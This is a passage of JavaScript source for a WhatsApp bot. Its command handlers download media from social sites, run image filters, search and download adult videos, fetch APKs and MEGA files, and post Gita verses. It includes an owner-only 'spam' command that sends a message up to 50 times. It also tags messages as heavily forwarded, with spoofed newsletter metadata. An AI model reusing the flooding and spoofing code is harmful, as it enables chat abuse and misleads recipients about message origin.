  for (const mediaData of mediaArray) {
    const mediaType = mediaData.type
    const mediaURL = mediaData.url_download
    let cap = `HERE IS THE ${mediaType.toUpperCase()}`
    if (mediaType === 'video') {
    	let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: cap
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: {url: mediaURL}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice ✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
    } else if (mediaType === 'image') {
    	let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: cap
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: mediaURL}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice ✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
    }
  }
}
break
case 'gimage':{
if (!text) return replygcalya(`Usage: ${prefix}gimage starking github`);
AlyaBotInc.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
let ini = await fetchJson(`https://aemt.me/googleimage?query=${q}`);
try{
for (let bing of ini.result) {
await sleep(500)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ``
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: bing }}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice ✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
AlyaBotInc.sendMessage(m.chat, { react: { text: `☑️`, key: m.key }})
}
} catch (e) {
AlyaBotInc.sendMessage(m.chat, { react: { text: `✖️`, key: m.key }})
}
}
break
case 'removebg': case 'nobg':{
if (!quoted) return replygcalya(`Send/Reply Image With Caption ${prefix + command}`)
if (!/image/.test(mime)) return replygcalya(`Send/Reply Image With Caption ${prefix + command}`)
let q = m.quoted ? m.quoted : m
let media = await q.download()
let url = await uploadImage(media)
let anu = await fetch(`https://aemt.me/removebg?url=${url}`)
let data = await anu.json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Here you go!`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: data.result}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice ✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case'tozombie':{
if (!quoted) return replygcalya(`Send/Reply Image With Caption ${prefix + command}`)
if (!/image/.test(mime)) return replygcalya(`Send/Reply Image With Caption ${prefix + command}`)
let q = m.quoted ? m.quoted : m
let media = await q.download()
let url = await uploadImage(media)
let anu = await fetch(`https://aemt.me/converter/zombie?url=${url}`)
let data = await anu.json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Here you go!`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice ✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case'toanime':{
if (!quoted) return replygcalya(`Send/Reply Image With Caption ${prefix + command}`)
if (!/image/.test(mime)) return replygcalya(`Send/Reply Image With Caption ${prefix + command}`)
let q = m.quoted ? m.quoted : m
let media = await q.download()
let url = await uploadImage(media)
let gpt = await (await fetch(`https://itzpire.com/tools/jadianime?url=${url}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Here you go!`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url:gpt.result}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice ✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'capcut':{
if (!text) return replygcalya(`Enter the link\nExample\nhttps://www.capcut.net/sharevideo?template_id=7239111787965205762&language=in&region=ID`)
await AlyaBotInc.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
try{  
let anu = await fetchJson(`https://aemt.me/download/capcut?url=${text}`)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Here you go!`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: anu.result.video_ori}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice ✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
await AlyaBotInc.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
}catch (error) {
await AlyaBotInc.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
}
break 
case 'smeme': case 'stickermeme': case 'stickmeme': {

if (!/webp/.test(mime) && /image/.test(mime)) {
if (!text) return replygcalya(`Usage: ${prefix + command} text1|text2`)
let { TelegraPh } = require('./lib/uploader')

atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
mee = await AlyaBotInc.downloadAndSaveMediaMessage(quoted)

mem = await TelegraPh(mee)

meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}`

memek = await AlyaBotInc.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })


} else {
replygcalya(`Send/reply image with caption ${prefix + command} text1|text2`)
}
}

break

case'smeta': {
if (!/webp/.test(mime)) return replygcalya('Reply sticker!')
  var stiker = false
    try {
        let [packname, ...author] = q.split('|')
            //var author = (author  []).join('|')
                let mime = m.quoted.mimetype || ''
                        //let img = await q.download()
                            let img = await AlyaBotInc.downloadAndSaveMediaMessage(quoted, makeid(5))
                                if (!img) return replygcalya('Reply a sticker!')
                                    var stiker = await addExifAvatar(img, `Made by`, `Cheems Bot`)
                                      } catch (e) {
                                          console.error(e)
                                              if (Buffer.isBuffer(e)) stiker = e
                                                } finally {
                                                    if (stiker) AlyaBotInc.sendMessage(m.chat, {
                                                          sticker: stiker
                                                              }, {
                                                                    quoted: m
                                                                        })
                                                                            else return replygcalya('reply sticker')
                                                                              }
                                                                              }       
                                                                              break
case 'instagram2': case 'ig2':{
if (!text) return replygcalya(`Enter the link!!!`)
if (!isUrl(args[0])) return replygcalya(`Where is the link?`)
await AlyaBotInc.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try{   
let anu = await fetchJson(`https://aemt.me/download/igdl?url=${text}`)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Here you go!`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: anu.result[0].url }}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice ✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
await AlyaBotInc.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})  
}catch (error) {
await AlyaBotInc.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
}
break
case 'itunes': {
if (!text) return replygcalya('Please provide a song name')
  try {
    let res = await fetch(`https://api.popcat.xyz/itunes?q=${encodeURIComponent(text)}`)
    if (!res.ok) {
      throw new Error(`API request failed with status ${res.status}`)
    }
    let json = await res.json()
    console.log('JSON response:', json)
    let songInfo = 
    `*Song Information:*\n
     • *Name:* ${json.name}\n
     • *Artist:* ${json.artist}\n
     • *Album:* ${json.album}\n
     • *Release Date:* ${json.release_date}\n
     • *Price:* ${json.price}\n
     • *Length:* ${json.length}\n
     • *Genre:* ${json.genre}\n
     • *URL:* ${json.url}`
    // Check if thumbnail is present, then send it with songInfo as caption
    if (json.thumbnail) {
      let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: songInfo
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({image: {url:json.thumbnail}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice ✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
    } else {
      replygcalya(songInfo)
    }
  } catch (error) {
    console.error(error)
  }
}
break
case 'spam':
				if (!AlyaTheQueen) return AlyaStickOwner()
					if (!text) return replygcalya(`Use ${prefix +command} text|amount`)
				alyaarg = text.split("|")
				if (!alyaarg) return replygcalya(`Use ${prefix+ command} text|amount`)
				if (Number(alyaarg[1]) >= 50) return replygcalya('Max 50!')
				if (isNaN(alyaarg[1])) return replygcalya(`must be a number`)
				for (let i = 0; i < alyaarg[1]; i++){
					AlyaBotInc.sendMessage(from, {text: alyaarg[0]})
				}
				break
case 'simisimi': case 'simi':
if (!text) replygcalya('What do u want to ask?')
let simi = await fetchJson(`https://aemt.me/simi?text=${text}`)
const simi2 = simi.result
AlyaBotInc.sendMessage(m.chat, {text: simi2}, {quoted: m})
break
case 'clearall': {
if (!AlyaTheQueen) return AlyaStickOwner()
AlyaBotInc.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
}
break
case 'pinchat': {
if (!AlyaTheQueen) return AlyaStickOwner()
if (m.isGroup) return AlyaStickPrivate()
AlyaBotInc.chatModify({ pin: true }, m.chat)
}
break
case 'unpinchat': {
if (!AlyaTheQueen) return AlyaStickOwner()
if (m.isGroup) return AlyaStickPrivate()
AlyaBotInc.chatModify({ pin: false }, m.chat)
}
break
case 'database': {
if (!AlyaTheQueen) return AlyaStickOwner()
totalreg = Object.keys(global.db.data.users).length
    let rtotalreg = Object.values(global.db.data.users).filter(user => user.registered == true).length
    replygcalya(`*${totalreg} users using Bot*`)
}
break 
case 'getjoinrequest':{
	if (!m.isGroup) return AlyaStickGroup()
	if (!isBotAdmins) return AlyaStickBotAdmin()
if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
	const response = await AlyaBotInc.groupRequestParticipantsList(m.chat);
  if (!response || !response.length) {
    AlyaBotInc.sendMessage(m.chat, {text: 'No pending join requests. ✅'}, {quoted:m});
    return;
  }
  let replyMessage = `${themeemoji} Join Request List:\n`;
  response.forEach((request, index) => {
    const { jid, request_method, request_time } = request;
    const formattedTime = new Date(parseInt(request_time) * 1000).toLocaleString();
    replyMessage += `\n*No.: ${index + 1} Request Details. 👇*`;
    replyMessage += `\n🧟‍♂️ *JID:* ${jid}`;
    replyMessage += `\n🧪 *Method:* ${request_method}`;
    replyMessage += `\n⏰ *Time:* ${formattedTime}\n`;
  });

  AlyaBotInc.sendMessage(m.chat, {text: replyMessage}, {quoted:m});
};
break
case 'twitter': case 'twitterdl': case 'twitterdl': {
	if (!args[0]) return replygcalya(`📌 Example : \n*${prefix + command}* https://twitter.com/fernandavasro/status/1569741835555291139?t=ADxk8P3Z3prq8USIZUqXCg&s=19`)
	if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return replygcalya('Link Invalid!')
          try {
          let { SD, HD, desc, thumb, audio } = await fg.twitter(args[0])
          let te = ` 
┌─⊷ *TWITTER DL*
▢ Description: ${desc}
└───────────`
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: te
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({video: {url:HD}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice ✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
} catch (e) {
  	replygcalya(`Verify that the link is from Twitter`)
	}
}
break
case 'xvideodl': case 'xvideosearch': case 'xvideo': case 'xvideos': case 'xvideosdl': {
	if (!m.isGroup) return AlyaStickGroup()
	if (!AntiNsfw) return replygcalya(mess.nsfw)
  if (!text) return replygcalya(`What do you want to search?\nUsage: *${prefix + command} <search>*\n\nExample: ${prefix+command} hot japanese\nyou can use a link as well\nExample: ${prefix+command} link *`);
    if (!text) return replygcalya('Please provide a search query or a valid Xvideos URL.');
    // Check if the input is a valid Xvideos URL
    const isURL = /^(https?:\/\/)?(www\.)?xvideos\.com\/.+$/i.test(text);
   try {
      if (isURL) {
        // If it's a valid URL, directly download the video
        const result = await xvideosdl(text);
        const { title, url } = result.result; 
        // Send the video file
        const response = await fetch(url);
        const buffer = await response.arrayBuffer();
        let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Here you go!!\nTitle: ${title}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: Buffer.from(buffer)}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😂💦\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
      } else {
        // If it's not a valid URL, perform a search and display the search results
        const results = await xvideosSearch(text);
        if (results.length === 0) {
          replygcalya('No search results found for the given query.');
        } else {
          const searchResults = results.map((result, index) => {
            return `${index + 1}. *${result.title}*\nDuration: ${result.duration}\nQuality: ${result.quality}\nURL: ${result.url}`;
          }).join('\n\n');  
          let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `*Search Results for "${text}":*\n\n${searchResults}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😂\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
        }
      }
    } catch (error) {
      console.error(error);
      return replygcalya('Failed to fetch Xvideos video details.');
    }
  };
  break
  case 'xnxxdl': case 'xnxx': case 'xnxxsearch': {
  if (!m.isGroup) return AlyaStickGroup()
	if (!AntiNsfw) return replygcalya(mess.nsfw)
  if (!text)
    return replygcalya(`What do you want to search?\nUsage: *${prefix + command} <search>*\n\nExample: Hot japanese\nor you can use a link as well\nExample: .${prefix + command} link *`)
  let url
  try {
    url = new URL(text)
  } catch (error) {
    url = null
  }
  if (url) {
    try {
      const files = await xnxxdl(url.href)
      if (files && files.high) {
      	let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Here you go!!`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: {url: files.high}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😂💦\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
        AlyaBotInc.sendMessage(m.chat, {video:{url: files.high}, caption: 'Here is go!!'}, {quoted:m})
      } else {
        replygcalya('🔴 Error: Failed to retrieve the download URL.')
      }
    } catch (e) {
      console.error(e)
      replygcalya('🔴 Error: We encountered a problem while processing the request.')
    }
  } else {
    try {
      const results = await xnxxSearch(text)
      if (results.length > 0) {
        const message = results.map((r, i) => `${i + 1}. [${r.title}](${r.link})`).join('\n')
        let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: message
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😂\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionJid: AlyaBotInc.parseMention(message),
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
      } else {
        replygcalya('🔴 Error: No search results found.')
      }
    } catch (e) {
      console.error(e)
      replygcalya('🔴 Error: We encountered a problem while processing the request.')
    }
  }
}
break
case 'gita-verse': case 'gita': case 'bhagavatgita': {
	try {
    // Extract the verse number from the command text.
    let verseNumber = m.text.split(' ')[1]
    if (!verseNumber || isNaN(verseNumber)) {
      verseNumber = Math.floor(Math.random() * 700) + 1
    }
    let res = await fetch(`https://gita-api.vercel.app/odi/verse/${verseNumber}`)
    if (!res.ok) {
      let error = await res.json()
      throw new Error(
        `API request failed with status ${res.status} and message ${error.detail[0].msg}`
      )
    }
    let json = await res.json()
    console.log('JSON response:', json)
    let gitaVerse = `
🕉 *Bhagavad Gita: Sacred Teachings*\n
📜 *Chapter ${json.chapter_no}: ${json.chapter_name}*\n
Verse ${json.verse_no}:\n
" ${json.verse} "\n
*🔮 Translation:*\n
${json.translation}\n
*🧘‍♂️ Spiritual Insight (Purport):*\n
${json.purport}`
    replygcalya(gitaVerse)
    if (json.audio_link) {
      AlyaBotInc.sendMessage(m.chat, {audio: {url:json.audio_link}, mimetype: 'audio/mp4', ptt: true}, {quoted:m})
    }
  } catch (error) {
    console.error(error)
    // Handle the error appropriately
  }
}
break
case 'apk': {
	try {
    if (command === 'apk') {
      if (!text) return replygcalya(`*[❗] Please provide the APK Name you want to download.*`);
      let data = await download(text);
      if (data.size.replace(' MB', '') > 200) {
        return await AlyaBotInc.sendMessage(m.chat, { text: '*[⛔] The file is too large.*' }, { quoted: m });
      }
      if (data.size.includes('GB')) {
        return await AlyaBotInc.sendMessage(m.chat, { text: '*[⛔] The file is too large.*' }, { quoted: m });
      }
      await AlyaBotInc.sendMessage(
        m.chat,
        { document: { url: data.dllink }, mimetype: 'application/vnd.android.package-archive', fileName: data.name + '.apk', caption: null },
        { quoted: m }
      )
    }
  } catch {
    return replygcalya(`*[❗] An error occurred. Make sure to provide a valid link.*`);
  }
};
break
case 'mega':{
	try {
if (!text) return replygcalya(`${prefix + command} https://mega.nz/file/ovJTHaQZ#yAbkrvQgykcH_NDKQ8eIc0zvsN7jonBbHZ_HTQL6lZ8`);
const { File } = require('megajs');
        const file = File.fromURL(text);
        await file.loadAttributes();
        if (file.size >= 300000000) return replygcalya('Error: File size is too large (Maximum Size: 300MB)');
        const downloadingMessage = `🌩️ Downloading file... Please wait.`;
        replygcalya(downloadingMessage);
        const caption = `*_Successfully downloaded..._*\nFile: ${file.name}\nSize: ${formatBytes(file.size)}`;
        const data = await file.downloadBuffer();
        const fileExtension = path.extname(file.name).toLowerCase();
        const mimeTypes = {
            ".mp4": "video/mp4",
            ".pdf": "application/pdf",
            ".zip": "application/zip",
            ".rar": "application/x-rar-compressed",
            ".7z": "application/x-7z-compressed",
            ".jpg": "image/jpeg",
            ".jpeg": "image/jpeg",
            ".png": "image/png",
        };
        let mimetype = mimeTypes[fileExtension] || "application/octet-stream";
        await AlyaBotInc.sendMessage(m.chat, {document: data, mimetype: mimetype, fileName: file.name, caption: caption}, {quoted:m});
    } catch (error) {
        return replygcalya(`Error: ${error.message}`);
    }
}
break
case 'diffusion':{
if (!text) return replygcalya('What do u want to make?')
    let myHeaders = new Headers();
    myHeaders.append("Content-Type", "application/json");
    let raw = JSON.stringify({
